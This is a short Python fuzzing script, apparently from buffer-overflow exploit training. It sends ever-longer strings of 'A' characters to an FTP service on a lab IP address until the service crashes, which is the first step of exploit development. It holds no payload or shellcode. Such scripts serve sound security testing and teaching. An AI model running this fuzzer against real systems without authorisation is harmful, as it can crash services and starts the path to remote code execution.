#!/usr/bin/env python3 
import sys,time,socket
ip = "10.0.2.14"  #Change This
port = 21  #Change This
timeout = 5
prefix = ""  #Change This
string = prefix + "A"*100
while True:
	try:
		with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
			s.settimeout(timeout)
			s.connect((ip,port))
			s.recv(1024)
			print ("Fuzzing with {} bytes".format(len(string)-len(prefix)))
			s.send(bytes(string,"latin-1"))
			s.recv(1024)
	except:
		print ("Fuzzing crashed at {}".format(len(string)-len(prefix)))
		sys.exit(0)
	string = string+ "A"*100
	time.sleep(1) 
